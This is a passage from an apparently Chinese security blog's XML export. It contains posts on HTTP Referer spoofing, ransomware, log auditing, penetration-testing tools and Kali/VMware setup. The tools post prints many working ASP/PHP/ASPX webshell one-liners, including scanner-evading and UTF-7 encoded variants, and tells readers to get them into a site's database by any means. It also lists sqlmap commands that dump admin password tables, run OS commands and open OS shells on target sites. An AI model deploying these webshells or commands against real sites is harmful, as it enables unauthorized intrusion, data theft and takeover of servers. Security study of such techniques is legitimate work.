color="#FF0000">HTTP_REFERER的用法及伪造</font></h1><hr><ol><li>介绍： HTTP_REFERER提供了引导用户代理到当前页的前一页的地址信息，常见的一些应用场景有防盗链，统计文章有多少次是来自谷歌搜索结果，多少次来自百度搜索结果等。 </li><li>防盗链：文字这个层面我们没法控制，但是图片这个层面我们是可以控制的。有些网站文字可以复制，但是黏贴下来发表之后经常出现图片无法显示。因为a站点的图片全部存储在c站点（云服务器）上，c站点将识别调用方是否来自a站点，否则显示一张错误图片，b站是盗图网站，b站和a站的代码一致，但是由于referer不一样，所以无妨访问资源。</li><li>获取referer条件：①存在前导页②浏览器(客户端)请求</li><li>无法获取referer：①在浏览器内直接敲URL②windows桌面上的超链接图标③浏览器内书签④第三方软件（如Word，Excel等）内容中的链接⑤SSL认证网站跳入⑥<a href="http://example.com/“&gt;" target="_blank" rel="noopener">http://example.com/“&gt;</a> meta页面设置自动跳转时，在example.com将取不到REFERER URL⑦使用JavaScript的Location.href或者是Location.replace()</li><li>可以获取到referer：①直接用②form提交的表单(POST或GET)③src请求(如js的script标签及html中img标签的src属性)</li><li><p>伪造HTTP_REFERER：<br>①接口代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$HTTP_REFERER = <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>]) ? $_SERVER[<span class="string">'HTTP_REFERER'</span>] : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">exit</span>(json_encode(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'status'</span> =&gt; <span class="string">'ok'</span>,</span><br><span class="line">        <span class="string">'refer'</span> =&gt; $HTTP_REFERER </span><br><span class="line">        )</span><br><span class="line">));</span><br></pre></td></tr></table></figure><p>②curl：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl_post</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">     $ch = curl_init();</span><br><span class="line">     curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">     curl_setopt($ch, CURLOPT_REFERER, <span class="string">'http://www.google.com'</span>); </span><br><span class="line">     $output = curl_exec($ch);</span><br><span class="line">     curl_close($ch);</span><br><span class="line">     <span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(curl_post(<span class="string">"http://www.c.com/api.php"</span>));</span><br><span class="line"><span class="comment">#执行结果如下：&#123;"status":"OK","refer":"http:\/\/www.google.com"&#125; boolean true</span></span><br></pre></td></tr></table></figure><p>③file_get_contents:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$opts = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">'http'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'method'</span>=&gt;<span class="string">"GET"</span>,</span><br><span class="line">    <span class="string">'header'</span>=&gt;<span class="string">"Referer: http://www.google.com"</span></span><br><span class="line">  )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$context = stream_context_create($opts);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the file using the HTTP headers set above</span></span><br><span class="line">var_dump(file_get_contents(<span class="string">'http://www.c.com/api.php'</span>, <span class="keyword">false</span>, $context));</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行结果：string'&#123;"status":"OK","refer":"http:\/\/www.google.com"&#125;'</span></span><br></pre></td></tr></table></figure><p>④socket：</p><pre><code class="txt"></code></pre></li></ol><h1 id="勒索软件"><a href="#勒索软件" class="headerlink" title="勒索软件"></a><font color="#FF0000">勒索软件</font></h1><hr><ol><li>介绍：通过骚扰、恐吓甚至采用绑架用户文件等方式，使用户数据资产或计算资源无法正常使用，并以此为条件向用户勒索钱财。</li><li>危害：锁屏勒索(手机无法正常使用)、加密勒索(重要数据被加密，数据丢失，重要客户资料、合同数据)、库加密(可以直接叫停企业)</li><li>常用加密方式：对称加密与非对称加密，AES算法、RSA算法使用最多。</li><li>抵挡措施：<br>第一步:关机、拔网线简单粗暴。<br>第二步:把硬盘抠出来 在其他电脑上 备份资料。<br>第三步:寻找有没有可用恢复数据的软件，尝试恢复,如果文件实在没法恢复，又不想支付赎金。那需要彻底格盘以后重装系统,也可以去找专业数据恢复人士进行数据恢复,如果有重要资料，也可以封存硬盘，等后续进展。</li></ol><h1 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a><font color="#FF0000">日志审计</font></h1><hr><ol><li>介绍：日志审计可以对系统进行错误排查，最主要的是可以发现一些异常的行为、不正常的URL请求等。便于攻击定位和事件溯源，时候的casestudy</li><li>重点：时间、IP、username、url、操作内容、成功失败；</li><li>难点：日志格式不统一、日志源、日志太大、rsyslog发送大量日志的时候，采用TCP导致过一次运维故障。</li><li>工具：elk、splunk<br>#未完待续……</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web知识基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP代理 </tag>
            
            <tag> webshell </tag>
            
            <tag> Cookie </tag>
            
            <tag> Session </tag>
            
            <tag> 默认网关 </tag>
            
            <tag> 子网掩码 </tag>
            
            <tag> DNS服务器 </tag>
            
            <tag> SSL安全套接层 </tag>
            
            <tag> VPN虚拟专用网络 </tag>
            
            <tag> NAT网络地址转换 </tag>
            
            <tag> XFF(X-Forwarded-For) </tag>
            
            <tag> TTL生存时间值 </tag>
            
            <tag> HTTP_REFERER </tag>
            
            <tag> 勒索软件 </tag>
            
            <tag> 日志审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试常用工具介绍</title>
      <link href="/2019/03/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%92%8C%E6%96%B9%E6%B3%95/"/>
      <url>/2019/03/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%92%8C%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">渗透测试常用工具介绍</font></center><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><font color="#FF0000">一句话木马</font></h1><hr><ol><li>介绍：一句话木马基于B/S结构，在注册信息的电子邮箱或者个人主页等中插入。<br>eval函数:把字符串按照PHP代码来执行，该字符串必须是合法的代码，且必须以分号结尾。<br>$_POST:PHP超全局变量$_GET和$_POST用于收集表单数据(form-data)  </li><li>使用方法：找到数据库是asp格式的网站，然后，以留言板，或者发表文章的方式，把一句话添加到asp数据库，或者加进asp网页<br><strong>记住!我们的目的是<font color="#FF0000">把一句话&lt;%execute request(“value”)%&gt;添加到数据库</font>,无论任何方式!</strong>  </li><li>服务器错误：当我们在一个asp文件中添加了一句话后，就会出现类型不匹配的错误。(Description:类型不匹配: ‘execute’)  </li><li>解决方法:用”eval”替换掉”execute”服务端,就不会出错了!</li><li>运行介绍：通过中国菜刀，一句话木马可以实现功能(上传文件、下载文件、修改文件、执行命令、数据库操作……)</li><li>位置：一句话木马可能在隐藏在正常的php文件中，也可以是一个单独的php(asp、aspx等)文件</li></ol><h1 id="常见一句话木马"><a href="#常见一句话木马" class="headerlink" title="常见一句话木马"></a><font color="#FF0000">常见一句话木马</font></h1><hr><ol><li><p>asp一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(<span class="string">"value"</span>))%&gt;</span><br></pre></td></tr></table></figure></li><li><p>php一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[value]);<span class="meta">?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>aspx一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;、&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"value"</span>])%&gt;</span><br></pre></td></tr></table></figure></li><li><p>其他一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"value"</span>)%&gt;</span><br><span class="line">&lt;%execute request(<span class="string">"value"</span>)%&gt;</span><br><span class="line">&lt;%execute(request(<span class="string">"value"</span>))%&gt;</span><br><span class="line">&lt;%<span class="keyword">If</span> Request(<span class="string">"value"</span>)&lt;&gt;<span class="string">""</span> Then Execute(Request(<span class="string">"value"</span>))%&gt;</span><br><span class="line">&lt;%<span class="keyword">if</span> request (<span class="string">"value"</span>)&lt;&gt;<span class="string">""</span>then session(<span class="string">"value"</span>)=request(<span class="string">"value"</span>):end <span class="keyword">if</span>:<span class="keyword">if</span> session(<span class="string">"value"</span>)&lt;&gt;<span class="string">""</span> then execute session(<span class="string">"value"</span>)%&gt;</span><br><span class="line">&lt;SCRIPT language=VBScript runat=<span class="string">"server"</span>&gt;execute request(<span class="string">"value"</span>)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;</span><br><span class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"value"</span>],<span class="string">"unsafe"</span>);%&gt;</span><br></pre></td></tr></table></figure></li><li><p>可以躲过雷客图的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">set ms = server.CreateObject(<span class="string">"MSScriptControl.ScriptControl.1"</span>)</span><br><span class="line">ms.Language=<span class="string">"VBScript"</span></span><br><span class="line">ms.AddObject <span class="string">"Response"</span>, Response</span><br><span class="line">ms.AddObject <span class="string">"request"</span>, request</span><br><span class="line">ms.ExecuteStatement(<span class="string">"ev"</span>&amp;<span class="string">"al(request("</span><span class="string">"value"</span><span class="string">"))"</span>)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li><li><p>不用”&lt;,&gt;”的asp一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=VBScript runat=server&gt;execute request(<span class="string">"value"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>不用双引号的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> request(chr(<span class="number">35</span>))%&gt;</span><br></pre></td></tr></table></figure></li><li><p>UTF-7编码加密:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ codepage=<span class="number">65000</span>%&gt;&lt;% response.Charset=”<span class="number">936</span>″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-<span class="comment">#+ACI)+j-)+j-%&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a><font color="#FF0000">中国菜刀</font></h1><hr><p>介绍：一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。</p><ol><li>文件管理：[特色]缓存下载目录，并支持离线查看缓存目录;</li><li>虚拟终端：[特色]人性化的设计，操作方便;(输入HELP查看更多用法)</li><li>数据库管理：[特色]图形界面,支持MYSQL,MSSQL,ORACLE,INFOMIX,ACCESS，以入支持ADO方式连接的数据库。</li><li>网站蜘蛛：织出一张网站的目录结构。<br><img src="https://s2.ax1x.com/2019/03/04/kOBh2n.png" alt="image"></li></ol><h1 id="大马"><a href="#大马" class="headerlink" title="大马"></a><font color="#FF0000">大马</font></h1><hr><p>大马一般具有文件操作、命令执行、提取、目录浏览等功能。<br>大马不需要中国菜刀，它本身就集成了完成各种功能所需要的代码。</p><h1 id="火狐插件——hackbar"><a href="#火狐插件——hackbar" class="headerlink" title="火狐插件——hackbar"></a><font color="#FF0000">火狐插件——hackbar</font></h1><hr><ol><li>hackbar是火狐浏览器的一个扩展插件，添加之后，按f12,出现在下方的导航栏上最后一位。</li><li>功能：SQL注入、XSS文件上传、编码解码等等<br><img src="https://s2.ax1x.com/2019/03/04/kOd0g0.png" alt="image"></li></ol><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><font color="#FF0000">sqlmap</font></h1><hr><ol><li>介绍：SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理(数据库指纹、访问底层文件系统、执行命令)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap使用:</span><br><span class="line">三种类型的sql注入检测：</span><br><span class="line">①GET方式的注入检测：URL显示并且传输的方式 </span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot;</span><br><span class="line">②POST方式的注入检测：隐秘传输方式</span><br><span class="line">    语句：sqlmap -u &quot;http://www.***.com.cn/document.php&quot; --data &quot;id=5&quot;</span><br><span class="line">③Cookie中转注入(通过cookie提交注入语句)(如果注入网站需要经过登录界面，可以添加抓包到的cookie信息到cookie参数中)：</span><br><span class="line">    语句：sqlmap -u http://172.16.12.2/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs --tables</span><br><span class="line">    -u 代表要测试的Url，--cookie表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来</span><br><span class="line"></span><br><span class="line">    语句：sqlmap.py -u http://172.16.12.2/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs -T admin --columns</span><br><span class="line">    -T代表 当前要猜解的表名， --columns 代表猜解列</span><br><span class="line"></span><br><span class="line">    语句：sqlmap.py -u http://172.16.12.2/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs -T admin -C admin password --dump</span><br><span class="line">    --dump的意思是 将数据内容脱到本地</span><br><span class="line"></span><br><span class="line">一：sqlmap中自带了识别waf的模块可以识别出网站的waf种类，如果安装的waf没有什么特征，识别出来的就是：Generic。</span><br><span class="line">    语句：sqlmap -u &quot;http://www.***.com.cn/document.php&quot; --identify-waf --batch</span><br><span class="line"></span><br><span class="line">二：获取数据库的数据库类型以及版本</span><br><span class="line">语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot;</span><br><span class="line"></span><br><span class="line">三：获取数据库的库名和用户名</span><br><span class="line">    ①获取数据库库名、表名、列名、字段</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --current-db</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --tables -D &quot;asq&quot;</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --columns -T &quot;nt_admin&quot; -D &quot;asq&quot;</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --dump -C &quot;admin_password&quot; -T &quot;nt_admin&quot; -D &quot;asq&quot;</span><br><span class="line">    ②获取数据库用户名</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --current-user</span><br><span class="line"></span><br><span class="line">四：获取数据库的数据量</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --count -D &quot;asq&quot;</span><br><span class="line"></span><br><span class="line">五：判断用户权限（sqlserver最高权限用户名:sa;mysql最高权限用户名:root）</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --privileges</span><br><span class="line"></span><br><span class="line">六：管理远程数据库</span><br><span class="line">    ①远程连接数据库</span><br><span class="line">     语句：sqlmap –d &quot;mysql://用户名:密码@地址:端口/数据库名&quot;</span><br><span class="line">    ②管理数据库</span><br><span class="line">     语句：sqlmap –d &quot;mysql://用户名:密码@地址:端口/数据库名&quot; --sql –shell</span><br><span class="line"></span><br><span class="line">七：延时注入：挖掘SQL注入过程中，页面无变化、无法用布尔真假判断、无法报错的情况下使用延时注入技术。缺点：耗时长</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --delay 10</span><br><span class="line">（延迟时间）</span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; -safe-freq</span><br><span class="line">八：(命令执行)提权 </span><br><span class="line">     语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --os-cmd =&quot;net user&quot;</span><br><span class="line">         （交互式命令必须知道网站的绝对路径）</span><br><span class="line">九、交互式写webshell：</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --os-shell</span><br><span class="line">    （会自动生成两个文件，可以通过网页访问，上传文件和执行代码，也可以直接加变量?cmd=”命令”）</span><br><span class="line">    （退出os-shell后，会自动删除这两个文件）</span><br><span class="line"></span><br><span class="line">十、Tamper脚本的使用和介绍</span><br><span class="line">语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --tamper=&quot;randomcase.py&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">十一：本地写入webshell</span><br><span class="line">     ①先在sqlmap目录下创建一个目录（mst）</span><br><span class="line">     ②需要管理员权限才能写入</span><br><span class="line">     ③两个参数</span><br><span class="line">         --file-write&quot;./mst/mst.txt&quot; 本地文件的地址</span><br><span class="line">      --file-dest&quot;d:/www/1.html&quot; 目标文件的地址</span><br><span class="line"> 语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --file-write&quot;./net/net.txt&quot; </span><br><span class="line">              --file-dest &quot;d:/www/1.html&quot;</span><br><span class="line"></span><br><span class="line">十二：批量检测注入</span><br><span class="line">     ①先将需要的URL都写入记事本</span><br><span class="line">       http://www.***.com.cn/document.php?a=1</span><br><span class="line">       http://www.***.com.cn/document.php?b=2</span><br><span class="line">       http://www.***.com.cn/document.php?c=3</span><br><span class="line">       http://www.***.com.cn/document.php?d=4</span><br><span class="line">       http://www.***.com.cn/document.php?e=5</span><br><span class="line">语句：sqlmap -m &apos;/media/sf_share/sqlmapceshi.txt&apos;</span><br><span class="line">     </span><br><span class="line">     ②配置好BurpSuite：</span><br><span class="line">      将BurpSuite的request记录保存到.log文件中</span><br><span class="line">语句：sqlmap -l burp.log --batch -smart</span><br><span class="line">（Smart：启发式快速判断，节约时间。Batch：自动选择yes）</span><br><span class="line">（level=(1-5)：要执行的测试水平等级,默认1。risk=(0-3)：要执行的风险等级,默认1）</span><br><span class="line"></span><br><span class="line">十三：-v数字 (七个等级，默认为1)</span><br><span class="line">0：只显示python错误以及严重的信息</span><br><span class="line">1：同时显示信息和警告信息(默认)</span><br><span class="line">2：同时显示debug的信息</span><br><span class="line">3：同时显示注入的payload</span><br><span class="line">4：同时显示HTTP请求</span><br><span class="line">5：同时显示HTTP响应头</span><br><span class="line">6：同时显示HTTP响应页面</span><br><span class="line"></span><br><span class="line">十四：结合BurpSuite抓包</span><br><span class="line">     ①使用参数--proxy=http://127.0.0.1:8080</span><br><span class="line">       语句：sqlmap -u &quot;http://www.***.com.cn/document.php?id=5&quot; --proxy=&quot;http://127.0.0.1:8080&quot;</span><br><span class="line"></span><br><span class="line">其他类型的数据库：MongoDB、NoSQL，sqlmap不支持但是可以通过nosqlmap注入</span><br><span class="line">网址：https://github.com/tcstool/nosqlmap</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.ax1x.com/2019/03/05/kjJ5Dg.png" alt="image"></p><h1 id="whois"><a href="#whois" class="headerlink" title="whois"></a><font color="#FF0000">whois</font></h1><hr><p>介绍：Whois简单来说，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息和数据库(如域名所有人、域名注册商、域名注册日期和过期日期等)。通过域名whois服务器查询，可以查询域名归属者的联系方式，以及注册和到期时间，可以用<font color="#FF0000">whois.chinaz.com</font>访问。</p><h1 id="linux常用系统命令与功能-netstat、whoami、useradd、passwd"><a href="#linux常用系统命令与功能-netstat、whoami、useradd、passwd" class="headerlink" title="linux常用系统命令与功能(netstat、whoami、useradd、passwd)"></a><font color="#FF0000">linux常用系统命令与功能(netstat、whoami、useradd、passwd)</font></h1><hr><p><img src="https://s2.ax1x.com/2019/03/05/kjtXBF.png" alt="image"></p><h1 id="windows常用系统命令与功能-ping、netstat、net-user、req、systeminfo"><a href="#windows常用系统命令与功能-ping、netstat、net-user、req、systeminfo" class="headerlink" title="windows常用系统命令与功能(ping、netstat、net user、req、systeminfo)"></a><font color="#FF0000">windows常用系统命令与功能(ping、netstat、net user、req、systeminfo)</font></h1><hr><ol><li>ping：可以对目标URL或者IP地址发送数据包，可以通过查看数据包是否丢失查看主机与目标机之间是否能够通讯。<br><img src="https://s2.ax1x.com/2019/03/05/kjttl6.png" alt="image"></li></ol><h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a><font color="#FF0000">WAF绕过</font></h1><hr><p>#未完待续……</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一句话木马 </tag>
            
            <tag> 中国菜刀 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> 大马 </tag>
            
            <tag> hackbar </tag>
            
            <tag> sqlmap </tag>
            
            <tag> whois </tag>
            
            <tag> linux常用系统命令和功能 </tag>
            
            <tag> Windows常用系统命令和功能 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali linux使用技巧</title>
      <link href="/2019/02/26/kali%20linux%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/02/26/kali%20linux%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="kali-linux-使用技巧"><a href="#kali-linux-使用技巧" class="headerlink" title="kali linux 使用技巧"></a><center><font color="#4094C7" size="4">kali linux 使用技巧</font></center></h2><h1 id="系统和软件更新"><a href="#系统和软件更新" class="headerlink" title="系统和软件更新"></a><font color="#FF0000">系统和软件更新</font></h1><hr><ol><li><font color="#FF0000">apt update</font>  ：只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）。  </li><li><font color="#FF0000">apt upgrade</font> ：更新已安装的软件包</li><li><font color="#FF0000">apt dist-upgrade</font>：apt upgrade 和 apt dist-upgrade 本质上是没有什么不同的。只不过，dist-upgrade 会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a 软件包。  </li><li>从上述可以看出，在执行apt upgrade和apt dist-upgrade之前应该先执行apt update。</li></ol><h1 id="三种网络模式介绍"><a href="#三种网络模式介绍" class="headerlink" title="三种网络模式介绍"></a><font color="#FF0000">三种网络模式介绍</font></h1><hr><ol><li><p>桥接模式：虚拟机和实体机在同一个网段<br><img src="https://s2.ax1x.com/2019/03/03/kL6NGQ.png" alt="image"><br>VMware设置过程：编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;桥接到-&gt;自动(也可以选择对应的网卡)-&gt;将虚拟机网络修改为桥接网络。<br>桥接模式下，实体机可以上网，虚拟机就可以上网。</p></li><li><p>NAT模式(网络地址转换模式)：虚拟机和实体机不在一个网段，相当于虚拟机将实体机作为路由器。<br><img src="https://s2.ax1x.com/2019/03/03/kL6XQA.md.png" alt="image"><br>VMware设置过程：编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;NAT模式-&gt;可以修改子网IP和子网掩码！</p></li><li><p>主机模式：虚拟机只能访问实体机，无法上网。设置过程和上面相同。<br><img src="https://s2.ax1x.com/2019/03/03/kLctw6.png" alt="image"></p></li></ol><h1 id="虚拟机快照"><a href="#虚拟机快照" class="headerlink" title="虚拟机快照"></a><font color="#FF0000">虚拟机快照</font></h1><hr><p>虚拟机的快照功能允许我们对当前虚拟机的所有运行状态(包括安装的软件、正在执行的程序)进行“定格”，以便恢复到快照时。<br><img src="https://s2.ax1x.com/2019/03/03/kLgT8e.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> VWware使用技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> VWmare </tag>
            
            <tag> 虚拟机快照 </tag>
            
            <tag> 三种网络模式 </tag>
            
            <tag> 系统和软件更新 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
